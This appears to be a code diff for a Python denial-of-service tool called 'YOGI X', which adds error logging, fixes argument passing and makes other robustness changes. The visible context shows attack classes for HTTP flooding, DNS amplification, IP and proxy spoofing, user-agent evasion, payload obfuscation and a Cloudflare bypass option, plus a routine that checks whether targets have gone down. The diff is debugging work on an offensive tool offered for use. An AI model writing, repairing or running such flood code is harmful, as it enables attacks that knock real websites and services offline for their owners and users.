@@ -240,6 +240,8 @@ class ResourceManager:
             
         except Exception as e:
             print(f"{Color.RED}[-] System optimization failed: {str(e)}{Color.END}")
+            return False
+        return True
 
 # ==================== PROFESSIONAL LOGIN SYSTEM ====================
 def authenticate():
@@ -410,6 +412,8 @@ class GhostIPSpoofer:
     def load_proxies(self):
         """Load proxy list from online sources"""
         proxy_cache_file = "proxies.cache"
+        proxies = []
+        
         if os.path.exists(proxy_cache_file):
             try:
                 with open(proxy_cache_file, "r") as f:
@@ -430,21 +434,23 @@ class GhostIPSpoofer:
                 try:
                     response = requests.get(source, timeout=10)
                     proxies.extend(response.text.strip().split('\n'))
-                except:
+                except Exception as e:
+                    print(f"{Color.YELLOW}[-] Proxy source failed: {source} - {str(e)}{Color.END}")
                     continue
             
             # Clean and validate
             proxies = [p.strip() for p in proxies if ':' in p and p.strip()]
             random.shuffle(proxies)
+            proxies = proxies[:5000]  # Limit to 5000 proxies
             
             # Save to cache
             try:
                 with open(proxy_cache_file, "w") as f:
                     json.dump(proxies, f)
-            except:
-                pass
+            except Exception as e:
+                print(f"{Color.YELLOW}[-] Failed to save proxy cache: {str(e)}{Color.END}")
                 
-            return proxies[:5000]  # Limit to 5000 proxies
+            return proxies
         except Exception as e:
             print(f"{Color.RED}[-] Failed to load proxies: {str(e)}{Color.END}")
             return []
@@ -486,9 +492,8 @@ class GhostIPSpoofer:
             try:
                 with open(cdn_cache_file, "w") as f:
                     json.dump(cdn_ranges, f)
-            except:
-                pass
-                
+            except Exception as e:
+                print(f"{Color.YELLOW}[-] Failed to save CDN cache: {str(e)}{Color.END}")
         except Exception as e:
             print(f"{Color.RED}[-] Failed to load CDN ranges: {str(e)}{Color.END}")
             print(f"{Color.YELLOW}[!] Using default CDN ranges{Color.END}")
@@ -513,7 +518,8 @@ class GhostIPSpoofer:
                 count = min(10000, size // len(self.cdn_ranges))
                 for ip in random.sample(list(network.hosts()), count):
                     pool.append(str(ip))
-            except:
+            except Exception as e:
+                print(f"{Color.YELLOW}[-] Error generating IPs from {cidr}: {str(e)}{Color.END}")
                 continue
         
         # Fill with random IPs
@@ -592,12 +598,13 @@ class GhostEvasion:
             try:
                 with open(ua_cache_file, "w") as f:
                     json.dump(ua_list, f)
-            except:
-                pass
+            except Exception as e:
+                print(f"{Color.YELLOW}[-] Failed to save UA cache: {str(e)}{Color.END}")
                 
             return ua_list
-        except:
-            print(f"{Color.RED}[-] Failed to load user agents, using defaults{Color.END}")
+        except Exception as e:
+            print(f"{Color.RED}[-] Failed to load user agents: {str(e)}{Color.END}")
+            print(f"{Color.YELLOW}[!] Using default user agents{Color.END}")
             return [
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
             ]
@@ -624,11 +631,12 @@ class GhostEvasion:
             try:
                 with open(ref_cache_file, "w") as f:
                     json.dump(top_sites, f)
-            except:
-                pass
+            except Exception as e:
+                print(f"{Color.YELLOW}[-] Failed to save referrer cache: {str(e)}{Color.END}")
             return top_sites
-        except:
-            print(f"{Color.RED}[-] Failed to load referrers, using defaults{Color.END}")
+        except Exception as e:
+            print(f"{Color.RED}[-] Failed to load referrers: {str(e)}{Color.END}")
+            print(f"{Color.YELLOW}[!] Using default referrers{Color.END}")
             return [
                 "https://www.google.com/", "https://www.youtube.com/", 
                 "https://www.facebook.com/", "https://www.amazon.com/"
@@ -705,8 +713,8 @@ class GhostEvasion:
             obfuscator = random.choice(self.obfuscation_techniques)
             try:
                 payload = obfuscator(payload)
-            except:
-                pass
+            except Exception as e:
+                print(f"{Color.YELLOW}[-] Payload obfuscation failed: {str(e)}{Color.END}")
         return payload
 
 # ==================== YOGI X STATS ====================
@@ -824,11 +832,11 @@ class GhostAttackEngine:
             resolver.nameservers = resolvers
             answer = resolver.resolve(self.target, 'A')
             return str(answer[0])
-        except:
+        except Exception as e:
             try:
                 return socket.gethostbyname(self.target)
-            except:
-                print(f"{Color.RED}[-] Failed to resolve {self.target}{Color.END}")
+            except Exception as e2:
+                print(f"{Color.RED}[-] Failed to resolve {self.target}: {str(e)} | {str(e2)}{Color.END}")
                 return None
 
     def create_socket(self):
@@ -873,7 +881,9 @@ class GhostAttackEngine:
             # Try to connect
             try:
                 sock.connect((self.target_ip, self.port))
+                success = True
             except Exception as e:
+                print(f"{Color.RED}[-] Connection failed: {str(e)}{Color.END}")
                 return 0, 0, 0, False, 0
             
             # Number of requests per connection
@@ -920,6 +930,7 @@ class GhostAttackEngine:
                     time.sleep(0.01)
                     
                 except Exception as e:
+                    print(f"{Color.YELLOW}[-] Request failed: {str(e)}{Color.END}")
                     break
                 
                 # Additional payload in permanent mode
@@ -929,10 +940,11 @@ class GhostAttackEngine:
                         sock.sendall(payload[:1024].encode())
                         bytes_sent += 1024
                         damage += 0.1
-                    except:
+                    except Exception as e:
+                        print(f"{Color.YELLOW}[-] Malicious payload failed: {str(e)}{Color.END}")
                         break
         except Exception as e:
-            pass
+            print(f"{Color.RED}[-] HTTP flood error: {str(e)}{Color.END}")
         finally:
             try:
                 if sock:
@@ -975,22 +987,27 @@ class GhostAttackEngine:
                         packets_sent += 1
                         bytes_sent += len(dns_data)
                         success = True
-                    except:
+                    except Exception as e:
+                        print(f"{Color.YELLOW}[-] DNS packet failed: {str(e)}{Color.END}")
                         continue
             
-        except:
-            pass
+        except Exception as e:
+            print(f"{Color.RED}[-] DNS amplification failed: {str(e)}{Color.END}")
         
         return 0, packets_sent, bytes_sent, success, 0.2
 
     def execute_attack(self):
         """Execute attack based on type"""
-        if self.attack_type == "HTTP_FLOOD":
-            return self.http_flood()
-        elif self.attack_type == "DNS_AMPLIFY" and self.dns_amplify:
-            return self.dns_amplification_attack()
-        else:
-            return self.http_flood()
+        try:
+            if self.attack_type == "HTTP_FLOOD":
+                return self.http_flood()
+            elif self.attack_type == "DNS_AMPLIFY" and self.dns_amplify:
+                return self.dns_amplification_attack()
+            else:
+                return self.http_flood()
+        except Exception as e:
+            print(f"{Color.RED}[-] Attack execution failed: {str(e)}{Color.END}")
+            return 0, 0, 0, False, 0
 
 # ==================== YOGI X CONTROLLER ====================
 class GhostController:
@@ -1002,14 +1019,14 @@ class GhostController:
         self.attack_type = attack_type
         self.duration = duration
         self.bot_count = bot_count
-        self.use_ssl = args.ssl
-        self.cf_bypass = args.cf_bypass
-        self.hyper_mode = args.hyper
-        self.permanent_mode = args.permanent
-        self.http2_mode = args.http2_mode
-        self.dns_amplify = args.dns_amplify
-        self.slow_post = args.slow_post
-        self.ghost_mode = args.ghost_mode
+        self.use_ssl = use_ssl
+        self.cf_bypass = cf_bypass
+        self.hyper_mode = hyper_mode
+        self.permanent_mode = permanent_mode
+        self.http2_mode = http2_mode
+        self.dns_amplify = dns_amplify
+        self.slow_post = slow_post
+        self.ghost_mode = ghost_mode
         self.stats = GhostStats()
         self.running = True
         self.executor = None
@@ -1020,7 +1037,8 @@ class GhostController:
             raise Exception("No valid targets found!")
         self.stats.targets = self.resolved_targets
         self.target_status = "UNKNOWN"
-        self.resource_mgr.apply_system_optimization()
+        if not self.resource_mgr.apply_system_optimization():
+            print(f"{Color.RED}[-] System optimization failed, performance may be degraded{Color.END}")
 
     def resolve_targets(self):
         """Resolve all targets in list"""
@@ -1036,11 +1054,11 @@ class GhostController:
                     resolver.nameservers = resolvers
                     answer = resolver.resolve(target, 'A')
                     resolved.append(str(answer[0]))
-            except:
+            except Exception as e:
                 try:
                     resolved.append(socket.gethostbyname(target))
-                except:
-                    print(f"{Color.RED}[-] Failed to resolve {target}{Color.END}")
+                except Exception as e2:
+                    print(f"{Color.RED}[-] Failed to resolve {target}: {str(e)} | {str(e2)}{Color.END}")
         return resolved
 
     def start_attack(self):
@@ -1080,6 +1098,7 @@ class GhostController:
                         self.stats.ghost_ips_generated += requests
                     except Exception as e:
                         self.stats.errors += 1
+                        print(f"{Color.YELLOW}[-] Attack thread error: {str(e)}{Color.END}")
                 
                 # Update stats
                 self.stats.active_threads = threading.active_count()
@@ -1097,8 +1116,9 @@ class GhostController:
                 try:
                     if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                         line = input()
-                        if line == 'stop':
+                        if line.lower() == 'stop':
                             self.running = False
+                            print(f"{Color.YELLOW}[!] Stopping attack by user request{Color.END}")
                 except:
                     pass
                 
@@ -1123,7 +1143,8 @@ class GhostController:
             result = sock.connect_ex((target, self.port))
             self.stats.target_status = "DOWN" if result != 0 else "UP"
             sock.close()
-        except:
+        except Exception as e:
+            print(f"{Color.YELLOW}[-] Status check failed: {str(e)}{Color.END}")
             self.stats.target_status = "UNKNOWN"
 
     def stop_attack(self):
@@ -1300,6 +1321,10 @@ def main():
     elif args.target:
         target_list = [args.target]
     
+    if not target_list:
+        print(f"{Color.RED}[-] No valid targets specified!{Color.END}")
+        return
+    
     # Confirmation
     confirm = input(f"\n{Color.YELLOW}[?] LAUNCH YOGI X ATTACK ON {len(target_list)} TARGETS? (y/n): {Color.END}")
     if confirm.lower() != 'y':
@@ -1318,9 +1343,9 @@ def main():
             cf_bypass=args.cf_bypass,
             hyper_mode=args.hyper,
             permanent_mode=args.permanent,
-            http2_mode=False,
+            http2_mode=False,   # karena tidak ada argumennya, kita set False
             dns_amplify=args.dns_amplify,
-            slow_post=False,
+            slow_post=False,    # karena tidak ada argumennya, kita set False
             ghost_mode=args.ghost_mode
         )
         
